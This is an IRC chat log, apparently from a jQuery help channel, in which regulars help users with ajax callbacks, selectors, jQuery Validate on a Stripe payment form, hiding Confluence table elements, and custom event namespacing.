[13:29:21] <robertmaxrees> why not just have two buttons?
[13:29:41] <stan_man_can_> not a ton of space available in the UI
[13:29:49] <stan_man_can_> and why have two buttons if it's a toggle>?
[13:31:44] <robertmaxrees> toggles are gross.
[13:31:52] <robertmaxrees> imo
[13:31:59] <taplar_> in any case, if all your doing is adding or removing a class, then you can just do that
[13:32:06] <taplar_> add/remove class won't double add
[13:32:39] <robertmaxrees> yeah, if you just need the number of stuff, check out .filter.   iirc you can even pass it just a selector.
[13:32:50] <stan_man_can_> taplar_: Yeah I have it working now, thanks guys
[13:33:29] <stan_man_can_> I haven't done any front end stuff for a few years now i'm a bit out of it
[14:17:25] <mtx> hey there! can somebody help me with my ajax problem?
[14:17:37] <robertmaxrees> mtx if you have a quesiton, just ask!  if somebody can help, they will :)
[14:20:26] <mtx> great, I'm calling with ajax function on my server to get bootstrap's modal dialog. Inside response I've call to another function. But my first ajax function waits for second function to end. How can I skip waiting for second function to execute and just display my modal dialog and then see result of second function?
[14:22:27] <robertmaxrees> what's the "Second function"?
[14:22:28] <mtx> Or how can I call function right after ajax?
[14:22:31] <robertmaxrees> (share your code)
[14:22:49] <robertmaxrees> use something like jsfiddle or bpaste.
[14:23:30] <mtx> it's a bit complex.. I'll try
[14:23:37] <robertmaxrees> i don't want all of your code.
[14:23:41] <robertmaxrees> just the few small relevant bits.
[14:24:06] <robertmaxrees> but long story short, you have to wait to show the contents of the modal until after the ajax call has finished.  you use .done() to do that.
[14:24:30] <robertmaxrees> i also wouldn't put javascript in the return of the ajax call - you could return data and process that separately if you wanted.
[14:24:31] <hellyeah> yo
[14:31:18] <mtx> robertmaxrees, so here is my code: http://jsfiddle.net/matox/2mv365Ly, when I'm calling testDialog() I need to wait for loadTest(1, 5) to finish, before I see anything
[14:32:02] <robertmaxrees> where is loadTest?
[14:32:20] <robertmaxrees> oh in your html.
[14:32:26] <mtx> loadTest() is just another ajax function that calls for additional data
[14:32:27] <robertmaxrees> don't do that.
[14:32:41] <mtx> I'm looking for some better code practices
[14:33:10] <robertmaxrees> instead, pass back an object with 2 properties - one is your markup and the other is the data for your loadTest function.
[14:33:56] <robertmaxrees> so then you'll get something like this: http://jsfiddle.net/robertmaxrees/2mv365Ly/2/
[14:34:04] <mtx> but then function lose it's purpuse.. loadTest() can take up to 30s
[14:34:21] <robertmaxrees> do you or don't you want to wait for loadTest?
[14:34:41] <robertmaxrees> and actually, it doesn't lose its purpose - those changes will make your code MUCH easier to understand and work with.
[14:35:07] <mtx> I want to wait, but I want to see modal screen while waiting
[14:35:19] <robertmaxrees> then look at the fiddle i just sent you.
[14:35:25] <robertmaxrees> that will give you exactly that.
[14:36:30] <mtx> will it work if i'm calling another ajax inside loadTest()?
[14:36:46] <robertmaxrees> why wouldn't it?
[14:38:25] <blakespot> Ok
[14:38:41] <blakespot> I have what looks like a two column table layout with 50 or so rows on the page
[14:38:42] <blakespot> It
[14:38:54] <blakespot> It's actually made with divs and foundation so it's rows and cols foundation style.
[14:39:39] <blakespot> all of the row div have the same classes - so nothing unique in each name
[14:39:48] <blakespot> .exhibitor-item is the row container
[14:39:58] <blakespot> inside each are the two data cells: .cell1 and .cell2
[14:40:16] <robertmaxrees> blakespot make a fiddle.
[14:40:24] <robertmaxrees> it'll take less time and make more sense to the rest of us.
[14:40:39] <blakespot> I need qith jQ to check to see which of .cell1 and .cell2 in each row is taller, and make the other one take on that greater height -- can I do this without something unique in the row class  names?
[14:41:01] <robertmaxrees> blakespot you want equal height columns?
[14:41:58] <blakespot> yes - look at this jpeg:
[14:42:06] <robertmaxrees> no pictures.
[14:42:07] <robertmaxrees> make a fiddle.
[14:42:22] <robertmaxrees> and iirc you can do this with css.
[14:44:14] <blakespot> Anyway, fwiw this is the "problem" https://www.dropbox.com/s/b1zccxcg7einpcz/nonequal_cells.png?dl=0
[14:44:23] <robertmaxrees> uh.
[14:44:34] <robertmaxrees> why do you keep ignoring my suggestion to make a fiddle?
[14:44:38] <blakespot> There are many framworks in play here and it would be complex to bring all that into a fiddle
[14:44:51] <robertmaxrees> actually it wouldn't because you don't need to bring in the frameworks.
[14:45:01] <robertmaxrees> this is something people do with CSS pretty regularly.  otherwise, use .each()
[14:45:40] <blakespot> I can try to get it up in Fiddle in a moment
[14:45:45] <blakespot> tnx
[14:46:07] <robertmaxrees> ask in #css
[14:46:13] <mtx> robertmaxrees, thanks for your response and your help :)
[14:46:16] <robertmaxrees> yep.
[14:59:07] <lyhr> I am using a statement $(".something").wrap('<div class="wrapper"></div>'); to wrap the .something class but I don't want to wrap any instance of .something that is also a member of .whatever How can i change my statement to accomplish that?
[15:03:01] <shoky> lyhr you can use .not() e.g.  $(".something").not(".whatever")   or if by "member of" you mean descendant of, then  $(".something").not(".whatever .something")
[15:03:39] <lyhr> shoky: let me try that out i think that might do it TY
[15:06:23] <lyhr> shoky yep that worked simple. thank you
[15:58:46] <DarioLap> Hi all, can you suggest me a plugin for drag & drop in a tree with 2 div: one with the list of tags, the other to compose the tree. Like this: https://github.com/dbushell/Nestable
[15:58:57] <robertmaxrees> huh?
[15:59:09] <robertmaxrees> why not use the one you linked?
[15:59:36] <DarioLap> robertmaxrees, It is no longer updated
[16:00:00] <DarioLap> i want to know if there are better
[16:00:59] <robertmaxrees> i'm not seeing anything except for that.
[16:01:05] <robertmaxrees> might be able to use that and expand upon it.
[16:03:20] <DarioLap> ok robertmaxrees
[16:11:31] <andy_wfc> What are plausible reasons that an ajax call would run both the success and error functions - assuming I'm not making the standard and executing the functions immediately rather than setting up callbacks? Code: http://jsbin.com/rexuboteke/edit?js
[16:12:01] <robertmaxrees> you're making 2 call.
[16:12:03] <robertmaxrees> *calls
[16:12:42] <andy_wfc> how? they're function definitions as lambdas, not function calls
[16:12:59] <robertmaxrees> i mean you're calling that ajax method twice.
[16:21:19] <andy_wfc> I don't think that's happening, but it would be an explanation. If the service is setting Content-Type as text/xml is that going to trigger any kind of automatic validation? Success occurs because the status is 200, Error occurs because something about the response isn't valid XML.
[16:21:48] <robertmaxrees> iirc you can't get both success and error, but if you want the definitive answer, use deferreds instead.
[16:23:17] <robertmaxrees> .done() and .fail() - if you're still getting both, the you're definitely calling it twice.
[16:26:08] <andy_wfc> cool, thanks.
[16:40:04] <rfr> Hi I am trying to modify this function http://jsfiddle.net/eqjmkdga/ adding the last for conditionals (address, city, state, zip_code, cc_select) but am getting the error: 'SyntaxError: expected expression, got '&&'' Can anyone tell me what I am doing wrong? Thanks
[16:41:04] <robertmaxrees> $form.find('[name=cardCVC]').val().length > 1) &&
[16:41:07] <robertmaxrees> have an extra ) there.
[16:41:39] <robertmaxrees> though there's a MUCH better way to handle this
[16:49:00] <rfr> robertmaxrees: Thank you. First let me learn how to fix it. Is this correct: http://jsfiddle.net/eqjmkdga/1/ ? And then I will ask you about tha undoubatably better way.
[16:49:38] <robertmaxrees> basically.
[16:56:06] <rfr> robertmaxrees: I am continuing to get errors in other places. If I post the form and explain what I need it to do could you give me a quote for how much you would charge to help me fix it? Tired of messing with it if getting it fixed doesn't break my budget I am willing to hire some help.
[16:56:31] <robertmaxrees> this is the wrong place to hire somebody.
[16:56:43] <robertmaxrees> i will help you do it - if you want to hire someone, go elsewhere :)
[16:58:24] <rfr> Okay, I guess I will stick with the do-it-myself approach. Sorry if I broke channel protocal very unfamiliar with JS and getting wery. Tried to look up the author to hire him but could not find his contact info. Again sorry.
[16:58:45] <robertmaxrees> that's a pretty unusual thing to do - why not learn how to fix it yourself?
[16:58:52] <robertmaxrees> it's probably much easier than you're making it.
[16:58:56] <robertmaxrees> what's the error you're getting now?
[17:00:03] <rfr> I sure you are right. I will stick with it thanks. Let me see if I can make sense of these new errors. Be back shortly I'm sure.
[17:00:14] <rfr> Let me get it.
[17:01:57] <rfr> Posting the whole hog. Back in a minute.
[17:02:00] <robertmaxrees> err.
[17:02:01] <robertmaxrees> wait.
[17:02:19] <robertmaxrees> don't paste the whole page - make an isolated test case instead.
[17:08:48] <rfr> Okay, Here it is: But I am pretty sure I posted too much of the <head> wasn't sure. http://jsfiddle.net/eqjmkdga/3/
[17:09:00] <robertmaxrees> yeha that's way too much.
[17:09:16] <robertmaxrees> pair down your questions.
[17:10:05] <robertmaxrees> also, why are you loading jquery validate if you're not going to fully use it?
[17:10:05] <rfr> Well, I am not sure where the error is this time it says: TypeError: a.validator.methods[d] is undefined
[17:10:39] <robertmaxrees> did you search google?
[17:10:39] <robertmaxrees> :)
[17:11:29] <rfr> I think I am trying to fully use it -- by incorporatinf the other input tags. Is that what you mean?
[17:11:30] <robertmaxrees> in particular, http://stackoverflow.com/a/25105093/923919 might be helpful.
[17:11:41] <robertmaxrees> paymentFormReady = function() { you don't need this function.
[17:11:46] <rfr> I will go there.
[17:11:48] <robertmaxrees> setup validators and chech that way.
[17:11:59] <robertmaxrees> also,also, var readyInterval = setInterval(function() { what is this about?
[17:12:29] <robertmaxrees> you're not trying to check the form every 250 ms to see if it's valid are you
[17:12:29] <robertmaxrees> ?
[17:13:27] <rfr> I am unfamiliar with JS to the extent that I don't yet know what I need and don't need.
[17:13:35] <robertmaxrees> then learn :)
[17:13:50] <robertmaxrees> otherwise, there are a lot of good freelancers out there.
[17:14:34] <rfr> Trying to learn. But may need a freelancer as I am under a bit of a time constraint.
[17:15:07] <robertmaxrees> alright.
[17:16:54] <rfr> I will take it error by error I guess. But just in case would you happen to know where I might find one of those good freelancers?
[17:17:02] <robertmaxrees> nope, i don't.
[17:17:23] <rfr> I march on alone then.
[17:18:45] <robertmaxrees> google is a good friend btw.
[17:19:06] <robertmaxrees> that error is likely partially caused by the fact that you're not including a file.
[17:19:23] <rfr> Thanks. Appreciate the help so far.
[17:19:27] <robertmaxrees> sure.
[17:19:34] <rfr> Okay, will keep in mind.
[17:27:36] <rfr> Okay, the jquery validator is used for the Stripe required inut fields and are very usefull. The reason I tried to add the others (address, city state, etc) is that need for the user to be able to submit without entering them. But then when I tied to add them I seemed to have opened a can of worms.  Any way I can make the other fields required without having query validate them?
[17:28:04] <robertmaxrees> err, but you DO want to validate them.
[17:28:04] <rfr> submit=NOT submit
[17:28:05] <robertmaxrees> right?
[17:29:13] <robertmaxrees> you're making sure they've filled in those fields, right?
[17:29:21] <rfr> That would be great. But so far trying to integrate them seems to be getting me further from my goal of getting this thing to work before my wife and kids abandon me.
[17:29:34] <robertmaxrees> uh, what?
[17:29:48] <robertmaxrees> you're not being very clear - you're checking length on those fields, right?
[17:29:50] <robertmaxrees> that's a form of validation.
[17:29:53] <rfr> That I think is all I need, to make sure they are filled in.
[17:30:06] <robertmaxrees> so you need to validate them.
[17:30:15] <robertmaxrees> you just need custom validation rules for them.
[17:30:50] <rfr> I guess yes as I need to make sure they are filled in.
[17:30:55] <robertmaxrees> right.
[17:32:04] <rfr> Is this a custom validation rule: jQuery.validator.addMethod("cardCVC", function(value, element) { ?
[17:32:46] <robertmaxrees> per http://jqueryvalidation.org/documentation/#link-validator - "jQuery.validator.addMethod() – Add a custom validation method."
[17:33:41] <robertmaxrees> but really, http://jqueryvalidation.org/documentation/#link-list-of-built-in-validation-methods should give you everything oyu need.
[17:37:22] <rfr> Okay, thanks
[18:29:06] <Guest43> Greetings. I'm trying to hide a certain table, or disable certain check boxes in a form from within that table, using jquery. Using this in Confluence, which uses jquery 1.7.2. I am able to "inject" custom code in head and body. Can I please get some help with this? I need to reference the elements via name (no id), and there's no div element I can just hide for that form.
[18:29:29] <robertmaxrees> then use an attribute selector.
[18:30:48] <robertmaxrees> Guest43 ^
[18:30:59] <Guest43> I have literally no idea how to achieve that
[18:31:12] <Buzzyboy> $(“[name=‘myName’])
[18:31:14] <Guest43> guess it's kinda obvious I'm very noobish at this :/
[18:31:17] <robertmaxrees> https://www.google.com/search?q=jquery+attribute+selector
[18:31:18] <robertmaxrees> ;)
[18:34:22] <Guest43> $("[name='confluence_checkbox_viewspace_anonymous']").attr('disabled', true); should work, right?
[18:34:31] <Guest43> assuming field name is that horrible thing
[18:34:32] <robertmaxrees> usually you want .prop()
[18:34:44] <robertmaxrees> but yes, that should function.
[18:35:18] <Guest43> brill!
[18:35:21] <Guest43> thanks
[18:38:38] <Buzzyboy> http://www.w3schools.com/cssref/css_selectors.asp
[18:38:43] <Buzzyboy> Learn it. Live it.
[18:38:44] <robertmaxrees> don't use w3schools
[18:38:52] <Buzzyboy> Why’s that?
[18:39:09] <robertmaxrees> they're often inaccurate and there are other superior resources available.
[18:39:39] <robertmaxrees> http://api.jquery.com/category/selectors/ if you're looking at jquery selectors
[18:40:02] <robertmaxrees> also, https://developer.mozilla.org/en-US/ is a fantastic HTML, CSS, and JS resources.
[18:40:04] <robertmaxrees> *resource
[18:41:17] <Buzzyboy> Could you find me an example of an inaccuracy? It could be reporterd to their admins.
[18:41:40] <robertmaxrees> this has been a long-running thing.  they've known and have actively ignored calls to improve for many years.
[18:41:50] <robertmaxrees> http://www.w3fools.com/
[18:42:34] <robertmaxrees> it's better than it used to be, but I still strongly discourage people from using that them.
[18:43:15] <Buzzyboy> I don’t use it too much unless it appears on my google search. Shame.
[18:43:40] <robertmaxrees> i almost always prepend searches with mdn or mdn javascript
[18:56:06] <Guest43> One more question please. <table id="aPermissionsTable" border="0" cellpadding="2" cellspacing="0" width="100%" class="permissions aui"> . How can I overwrite that, to be like 1px or 1% width? Again via jquery, and to that element only
[18:56:21] <robertmaxrees> select that ID.
[18:56:25] <robertmaxrees> and then use .css()
[18:56:39] <robertmaxrees> $('#aPermissionsTable').css('width', '1px');
[18:56:49] <Guest43> ah ok. .attr wasn't working. makes more sense that way
[18:56:51] <Guest43> thanks
[18:57:00] <robertmaxrees> you don't want .attr() normally anyway.
[18:58:47] <Guest43> It doesn;t seem to do anything. Can't see the new width in inspector either.
[18:59:42] <Guest43> should I consider inserting that at the end of the body? or in the head?
[18:59:51] <robertmaxrees> try console.log($('[id="aPermissionsTable"]').length) - that do you get?
[19:01:01] <Guest43> 1
[19:01:20] <robertmaxrees> is your code in a document ready or at the bottom of the page?
[19:01:32] <robertmaxrees> because that element needs to exist before you can change it.
[19:03:20] <Guest43> bottom
[19:06:52] <robertmaxrees> dunno then. maybe try .prop('width', '1%')?
[19:07:25] <Buzzyboy> In this case, you may need to override the attribute. Since that will take precedance.
[19:07:31] <Buzzyboy> In a table.
[19:07:39] <Buzzyboy> Unless you use !important.
[19:07:51] <robertmaxrees> shouldn't need important on inline styles.
[19:08:20] <Guest43> with prop I can see the new width, but stroked out, in inspector.
[19:08:35] <robertmaxrees> what are you actually trying to accomplish?
[19:08:36] <Guest43> and in inline too
[19:08:41] <robertmaxrees> why are you setting a width of 1%?
[19:08:44] <Guest43> basically hide some options from users
[19:08:49] <robertmaxrees> then use .hide()
[19:08:53] <Guest43> from a-technical users
[19:08:54] <robertmaxrees> or .css('display', 'none');
[19:09:08] <Guest43> display works on table?
[19:09:14] <Buzzyboy> Display works on anything. :P
[19:09:18] <robertmaxrees> yep.
[19:09:24] <robertmaxrees> there's even a... wait for it... display: table;
[19:09:37] <Buzzyboy> *dun dun dun*
[19:09:52] <Guest43> duh
[19:09:53] <Guest43> brill
[19:10:06] <Guest43> lol at disaply: table
[19:10:11] <Guest43> thank you guys! been of real help
[19:21:39] <rfr> robertmaxrees: you still around?
[19:21:58] <robertmaxrees> yep.
[19:22:11] <robertmaxrees> almost 600 people here - many of them can help you, too ;)
[19:24:14] <rfr> I think that I need to define the input tag for validator here: https://jsfiddle.net/gatorreina/h14c5xhz/ The problem is that I don't think that there is a Stripe rule for it as it is not something that Stripe requires. I just need it.
[19:25:45] <robertmaxrees> so tossing me a bunch of addmethod calls isn't really helpful. try setting up a function standalone test case instead.
[19:27:11] <rfr> OKay, sorry. Let me try to go figure that out. Be back when I do.
[19:27:30] <robertmaxrees> like, try to create a custom validator for one input.
[19:28:49] <rfr> I guess if I may ask is how I would add an element like that if Stripe doesn't care about it? The final function call 'address' is my attempt to do so.
[19:29:01] <robertmaxrees> like what?
[19:29:10] <robertmaxrees> you're conflating things.
[19:29:32] <robertmaxrees> does stripe provide its own validator?
[19:29:39] <rfr> Like 'address' 'city' 'state'?
[19:30:28] <robertmaxrees> what does stripe have to do with any of this?
[19:31:39] <rfr> Sorry, for not being clear. The comments say: /* Form validation using Stripe client-side validation helpers */
[19:31:47] <robertmaxrees> right, what does that have to do with anything?
[19:31:57] <robertmaxrees> jquery validate is handling validation, right?
[19:32:10] <rfr> Yes, I think so...
[19:32:16] <robertmaxrees> did you write any of that code?
[19:32:27] <robertmaxrees> or are you copy/pasting hoping something will work?
[19:32:52] <rfr> Only about the 10% that I am trying to make work as I need.
[19:33:08] <robertmaxrees> so the issue with jquery validate is you can't really go that route with iut.
[19:33:16] <robertmaxrees> you have to actually read the docs.
[19:33:20] <rfr> I have tried to contact the author for help but his emails bounce back.
[19:33:42] <robertmaxrees> he's also probably very busy ;)
[19:33:49] <taplar> lol, and it's open source
[19:34:16] <robertmaxrees> he'd probably point you to any of the available resources to help yourself.
[19:35:53] <robertmaxrees> it sounds like you need to just hire a developer at this point :)
[19:40:03] <rfr> I have sent emails to the author to try to hire him to help, but they bounce. I would have to pay for this personally so don't have alot of money to spend but would gladely hire someone to help me fix the form if I can afford it. This is for a site I am trying to launch that will raise money for charities so I am not being funded by corporate America or anyone else. If you know of where I can go to find someon
[19:40:09] <rfr> e to hire to help me fix the form and can tell me I would be very greatful as I am for your help thus far. Thank you
[19:41:24] <rfr> I have got everything else covered just not JS which this form requires.
[19:42:50] <robertmaxrees> have you tried searching google for resources?
[19:43:11] <robertmaxrees> there are a lot of options out there.
[19:44:14] <rfr> Just checking out https://www.freelancer.com now.
[19:44:28] <robertmaxrees> and emailing the author of a plugin is usually not the right way to do - they're busy too and often have other things going on.  jorn is the dev lead for jquery ui and does some other projects and is usually pretty busy.
[19:44:41] <robertmaxrees> so emailing him and asking for help is unlikely to get you assistance.
[19:45:44] <rfr> Don't get me wrong I am all for learn jquery just that this form I need to get working so in this point and time might need help.
[19:45:57] <fury_> hello! how can I get a data property of an element (as in https://api.jquery.com/data) in the context of 'this'? eg. $('a#whatever').click(function(){ /* this.data does not exist */ }); ?
[19:46:04] <fury_> or am I possibly doing something else wrong?
[19:46:16] <taplar> fury_: $(this).data(key)
[19:46:20] <robertmaxrees> fury_ the 'this' object inside of event handlers is the raw dom node - you want $(this).data()
[19:46:32] <fury_> ah, excellent. I'm a bit new, thanks both of you
[19:46:32] <robertmaxrees> also, don't prepend tag names onto ID selectors.
[19:46:33] <taplar> and instead of $('a#whatever')  just do $('#whatever')
[19:47:20] <fury_> more of a back-end guy, normally others do the js but I'm stuck with this one hehe
[19:47:26] <fury_> it's been years
[19:47:29] <fury_> fun to be back though.
[20:32:39] <vmasto> Hey guys, I was wondering if the following custom events are considered different: add.after and add.before
[20:32:55] <robertmaxrees> "are considered different"?
[20:33:01] <robertmaxrees> and where are you seeing them?
[20:33:10] <vmasto> let me explain a bit more
[20:33:44] <vmasto> so i have an action that adds something, I want to fire an event just before that something is added (add.before) and an event just after it gets added (add.after)
[20:34:09] <vmasto> having a bit of trouble wrapping my head around namespacing, are those events the same thing (does the .before, .after even matter) or will they be considered as separate events?
[20:34:40] <vmasto> similarly to how bootstrap does it for example with show.bs.modal
[20:34:50] <vmasto> and show.bs.tab
[20:40:14] <robertmaxrees> those are two separate events.
[20:40:56] <vmasto> thanks!
[20:41:08] <robertmaxrees> but you have things reverse.
[20:41:16] <robertmaxrees> you want after.add and before.add
[20:41:33] <robertmaxrees> " For example, "click.myPlugin.simple" defines both the myPlugin and simple namespaces for this particular click event. A click event handler attached via that string could be removed with .off("click.myPlugin") or .off("click.simple") without disturbing other click handlers attached to the elements. Namespaces are similar to CSS classes in that they are not hierarchical; only one name needs
[20:41:34] <robertmaxrees> to match. Namespaces beginning with an underscore are reserved for jQuery's use."
[20:58:40] <GitGud> :}
